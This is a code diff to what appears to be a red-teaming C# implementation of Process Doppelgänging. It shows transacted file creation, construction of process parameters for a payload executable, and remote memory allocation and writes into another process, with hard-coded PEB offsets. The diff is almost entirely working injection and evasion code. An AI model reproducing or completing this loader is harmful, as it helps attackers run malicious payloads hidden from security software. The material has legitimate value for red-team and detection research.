@@ -676,8 +676,11 @@ namespace ProcessDoppleganging
             string exe_path = @"D:\python\temp.exe";
             string payload_path = @"D:\red teaming tools\calc2.exe";
 
+           // string exe_path = args[0];
+           // string payload_path = args[1];
+
             IntPtr filehandle =CreateFileTransactedA(
-                @"D:\python\temp.exe",
+                exe_path,
                 0x40000000| 0x80000000,
                 0x00000002,
                 IntPtr.Zero,
@@ -769,46 +772,37 @@ namespace ProcessDoppleganging
             */
 
             IntPtr env;
-            CreateEnvironmentBlock(out env, IntPtr.Zero, true);
+            //CreateEnvironmentBlock(out env, IntPtr.Zero, true);
 
             //string WinDir = Environment.GetEnvironmentVariable("windir");
-            UNICODE_STRING uSystemDir = stringToUNICODE_STRING(@"C:\Windows\System32");
-            UNICODE_STRING uLaunchPath = stringToUNICODE_STRING(exe_path);
-            UNICODE_STRING uWindowName = stringToUNICODE_STRING("");
+            UNICODE_STRING systemdir = stringToUNICODE_STRING(@"C:\Windows\System32");
+            UNICODE_STRING imagepath = stringToUNICODE_STRING(payload_path);
+            UNICODE_STRING windowtitle = stringToUNICODE_STRING("");
             IntPtr environment = IntPtr.Zero;
-            UNICODE_STRING currentdir = stringToUNICODE_STRING(@"D:\python");
+            UNICODE_STRING currentdir = stringToUNICODE_STRING(@"D:\red teaming tools");
             //CreateEnvironmentBlock(out environment, IntPtr.Zero, true);
 
             IntPtr uppptr = IntPtr.Zero;
-            RtlCreateProcessParametersEx(ref uppptr, 
-                ref uLaunchPath,
-               ref uSystemDir,
+            RtlCreateProcessParametersEx(
+                ref uppptr, 
+                ref imagepath,
+               ref systemdir,
                ref currentdir, 
-              ref  uLaunchPath, 
+              ref imagepath, 
                 environment,
-               ref uWindowName,
-               ref uWindowName, 
+               ref windowtitle,
+               ref windowtitle, 
                 IntPtr.Zero, IntPtr.Zero, 1);
 
 
-            //RtlUserProcessParameters upp = new RtlUserProcessParameters();
+            // environment size offset 
+            //  Offset is 0x3F0 on x64
+            //     or 0x290 on x86
+            long value = Marshal.ReadInt64(uppptr + 0x3f0);
+            Console.WriteLine("envsize: {0}",value.ToString("X"));
+           // RtlUserProcessParameters temp = (RtlUserProcessParameters) Marshal.PtrToStructure(uppptr, typeof(RtlUserProcessParameters));
 
-            
-
-            
-           /* RtlCreateProcessParametersEx(
-                ref uppptr,
-                imagepath,
-                currentdir,
-                currentdir,
-               imagepath,
-                env,
-                windowtitle,
-               IntPtr.Zero,
-                IntPtr.Zero,
-                IntPtr.Zero,
-                1
-                );*/
+            // Console.WriteLine("Environment size: {0}",temp.EnvironmentSize.ToString("X"));
 
             Console.WriteLine("Setting error: {0}",Marshal.GetLastWin32Error());
 
@@ -821,6 +815,8 @@ namespace ProcessDoppleganging
             // 0x10 offset on 32 bit
 
             Int32 iProcessParamsSize = Marshal.ReadInt32((IntPtr)((Int64)uppptr + 4));
+            //  iProcessParamsSize += 0x2000;
+             iProcessParamsSize += (Int32) value;
 
             IntPtr startingptr = VirtualAllocEx(
                 prochandle,
@@ -871,56 +867,6 @@ namespace ProcessDoppleganging
             Console.WriteLine(remotebase.ToString("X"));
             //  Console.WriteLine(outwritten);
 
-
-
-            #region backup
-            /* PROCESS_BASIC_INFORMATION pbi = GetProcessImageBase(prochandle);
-             Console.WriteLine(pbi.PebAddress.ToString("X"));
-
-
-             IntPtr startingptr = VirtualAllocEx(
-                 prochandle,
-                 IntPtr.Zero,
-                (uint)Marshal.SizeOf(typeof(RtlUserProcessParameters)),
-                 0x00001000 | 0x00002000,
-                 0x04
-                 );
-
-             Console.WriteLine("Memory allocated at: {0}", startingptr.ToString("X"));
-
-             // commandline offset 0x70 64bit
-
-             IntPtr tempptr = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(UNICODE_STRING)));
-             Marshal.StructureToPtr(cmdline, tempptr, true);
-
-             Console.WriteLine(tempptr.ToString("X"));
-
-             byte[] bytecmdline = new byte[Marshal.SizeOf(typeof(UNICODE_STRING))];
-             Marshal.Copy(tempptr, bytecmdline, 0, Marshal.SizeOf(typeof(UNICODE_STRING)));
-
-             uint bytesout = 0;
-             WriteProcessMemory(
-                 prochandle,
-                 startingptr + 0x70,
-                 bytecmdline,
-                 bytecmdline.Length,
-                 ref bytesout
-                 );
-
-
-
-             long addr = startingptr.ToInt64();
-             byte[] test = BitConverter.GetBytes(addr);
-             uint outwritten = 0;
-             WriteProcessMemory(
-                 prochandle,
-                 pbi.PebAddress + 0x20,
-                 test,
-                 8,
-                 ref outwritten
-                 );
-             Console.WriteLine(Marshal.GetLastWin32Error());*/
-            #endregion
 
 
 
